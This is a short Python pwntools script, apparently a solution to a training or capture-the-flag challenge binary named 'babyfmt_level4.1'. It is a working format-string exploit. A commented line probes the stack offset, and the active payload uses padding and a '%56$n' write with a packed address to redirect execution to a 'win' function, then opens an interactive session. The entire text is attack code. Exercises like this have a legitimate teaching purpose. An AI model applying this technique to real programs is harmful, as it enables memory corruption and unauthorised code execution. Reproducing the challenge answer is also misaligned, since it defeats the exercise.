from pwn import *

io = process("/challenge/babyfmt_level4.1")

win_addr = 0x404140
#payload = b"BBAAAAAAAA" + b" %p" * 36
# offset = 36

payload = b"A" * 159 + b"%56$nBBBBBB" + p64(win_addr)
io.recvuntil(b"data!")
io.sendline(payload)
io.interactive()
